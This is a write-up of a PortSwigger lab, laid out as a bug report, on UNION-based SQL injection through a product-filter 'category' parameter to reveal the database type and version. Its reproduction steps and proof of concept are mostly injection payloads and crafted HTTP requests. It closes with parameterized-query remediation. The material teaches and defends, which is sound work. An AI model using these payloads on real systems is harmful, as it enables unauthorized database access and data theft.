
---
# SQL Injection in Product Filtering allows Database Type and Version Enumeration

## 1. Executive Summary

A SQL injection vulnerability exists in the application's product filtering functionality, where user-controlled input is incorporated into a backend SQL query without proper parameterization. By identifying the query's column count and a text-compatible column, an attacker can use a `UNION SELECT` query to retrieve database version information and determine whether the backend uses MySQL or Microsoft SQL Server.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection (SQLi) — Database Type and Version Enumeration
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application uses the `category` parameter in a SQL query similar to:

```
SELECT * FROM products
WHERE category = 'Gifts';
```

Because the parameter is incorporated into the SQL statement without parameterization, an attacker can inject SQL syntax and modify the original query.

For this lab, the database is either **MySQL** or **Microsoft SQL Server**. Both database systems provide functions that can be used to retrieve the database version.

- **MySQL:** `@@version`
    
- **Microsoft SQL Server:** `@@version`
    

The exact `UNION SELECT` payload must match the number of columns returned by the original query.

## 3. Steps to Reproduce (STR)

### Step 1 — Identify the injection point

1. Access the PortSwigger lab.
    
2. Navigate to the product filtering functionality.
    
3. Select any product category.
    
4. Intercept the request using Burp Suite.
    
5. Identify the `category` parameter.
    
6. Test the parameter with a SQL injection payload:
    

```
' OR 1=1--
```

7. Observe the response and confirm that the parameter is potentially injectable.
    

### Step 2 — Determine the number of columns

8. Test the query using `ORDER BY`:
    

```
' ORDER BY 1--
```

9. Increment the column number:
    

```
' ORDER BY 2--
```

10. Continue increasing the number until the application returns an error.
    

For example, if:

```
' ORDER BY 1--
```

and

```
' ORDER BY 2--
```

work, but:

```
' ORDER BY 3--
```

causes an error, the query contains **2 columns**.

An alternative approach is to use `UNION SELECT` with `NULL` values:

```
' UNION SELECT NULL--
```

```
' UNION SELECT NULL,NULL--
```

```
' UNION SELECT NULL,NULL,NULL--
```

The number of `NULL` values that produces a successful response indicates the number of columns.

### Step 3 — Identify a text-compatible column

11. Assuming the query contains two columns, test the first column:
    

```
' UNION SELECT 'test',NULL--
```

12. Test the second column:
    

```
' UNION SELECT NULL,'test'--
```

13. Observe which payload successfully displays `test` in the response.
    
14. This identifies a column capable of displaying string data.
    

### Step 4 — Query the database version

15. Once the column count and text-compatible column are identified, use the appropriate database-specific version function.
    

For **MySQL**, use:

```
' UNION SELECT @@version,NULL--
```

For **Microsoft SQL Server**, use:

```
' UNION SELECT @@version,NULL--
```

16. If the second column is the text-compatible column, reverse the placement:
    

```
' UNION SELECT NULL,@@version--
```

17. Send the request.
    
18. Observe the returned database version information.
    
19. The version string identifies the underlying database technology.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

The vulnerable request is conceptually:

```
GET /filter?category=<SQL_INJECTION_PAYLOAD> HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

After determining that the query contains two columns and the first column accepts text, a MySQL payload can be supplied as:

```
GET /filter?category=%27+UNION+SELECT+%40%40version%2CNULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The resulting query is conceptually:

```
SELECT * FROM products
WHERE category = ''
UNION
SELECT @@version, NULL
--';
```

For Microsoft SQL Server, the same version variable can be used:

```
SELECT @@version
```

Therefore:

```
' UNION SELECT @@version,NULL--
```

can return a response containing information such as:

```
Microsoft SQL Server ...
```

or, for MySQL:

```
8.0.x ...
```

The exact version string depends on the database instance used by the PortSwigger lab.

### Evidence (Screenshots/Video)




## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can manipulate the SQL query and retrieve database metadata. The `@@version` variable allows the attacker to identify the database technology and version, providing a fingerprint of the backend database.
    
- **Business Impact:** Database version disclosure gives an attacker valuable information for developing subsequent attacks. Knowing whether the application uses MySQL or Microsoft SQL Server allows the attacker to select database-specific syntax, functions, and exploitation techniques. In this lab, the demonstrated impact is database type and version disclosure.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all database operations involving user-controlled input. User input must never be directly concatenated into SQL statements.
    

Example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s",
    (category,)
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Avoid dynamically constructing SQL statements from user input.
    
- Apply least-privilege permissions to the application's database account.
    
- Avoid exposing database errors and version information to users.
    
- Use server-side input validation as an additional defense-in-depth measure.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection